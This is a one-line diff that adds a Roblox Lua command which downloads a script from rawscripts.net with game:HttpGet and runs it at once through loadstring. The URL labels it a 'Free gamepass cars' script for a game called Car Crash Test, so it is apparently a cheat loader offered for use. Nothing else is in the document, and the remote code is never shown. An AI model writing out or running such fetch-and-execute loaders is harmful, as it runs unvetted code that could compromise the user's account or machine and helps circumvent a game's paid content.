@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://rawscripts.net/raw/Car-Crash-Test-Free-gamepass-cars-READ-THE-DESCRIPTION-47539"))()
